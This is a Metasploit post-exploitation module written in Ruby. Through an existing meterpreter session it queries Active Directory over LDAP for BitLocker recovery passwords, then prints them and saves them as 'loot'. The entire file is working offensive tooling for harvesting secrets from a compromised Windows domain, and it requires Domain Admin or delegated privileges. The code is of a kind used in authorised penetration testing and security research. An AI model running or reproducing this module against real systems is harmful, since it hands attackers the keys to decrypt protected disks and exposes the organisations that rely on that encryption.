##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super( update_info( info,
      'Name'         => 'Windows Gather Active Directory Bitlocker Recovery',
      'Description'  => %Q{
        This module will enumerate bitlocker recovery passwords in the default AD
        directory. Requires Domain Admin or other delegated privileges.
      },
      'License'      => MSF_LICENSE,
      'Author'       => [ 'Ben Campbell <ben.campbell[at]mwrinfosecurity.com>' ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
      'References'   =>
        [
          ['URL', 'http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx']
        ]
    ))

    register_options([
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
      OptString.new('FIELDS', [true, 'FIELDS to retrieve.', 'distinguishedName,msFVE-RecoveryPassword']),
      OptString.new('FILTER', [true, 'Search filter.', '(objectClass=msFVE-RecoveryInformation)'])
    ], self.class)
  end

  def run
    fields = datastore['FIELDS'].gsub(/\s+/,"").split(',')
    search_filter = datastore['FILTER']
    max_search = datastore['MAX_SEARCH']
    begin
      q = query(search_filter, max_search, fields)
    rescue Rex::Post::Meterpreter::RequestError
      print_error("Failed to perform the LDAP query, maybe Bitlocker isn't available.")
      return
    end

    if q.nil? or q[:results].empty?
      return
    end

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
      'Header'     => "Bitlocker Recovery Passwords",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => fields
    )

    q[:results].each do |result|
      row = []

      0.upto(fields.length-1) do |i|
        if result[i].nil?
          field = ""
        else
          field = result[i]
        end

        row << field
      end

      results_table << row
    end

    print_line results_table.to_s
    if datastore['STORE_LOOT']
      stored_path = store_loot('bitlocker.recovery', 'text/plain', session, results_table.to_csv)
      print_status("Results saved to: #{stored_path}")
    end
  end

end

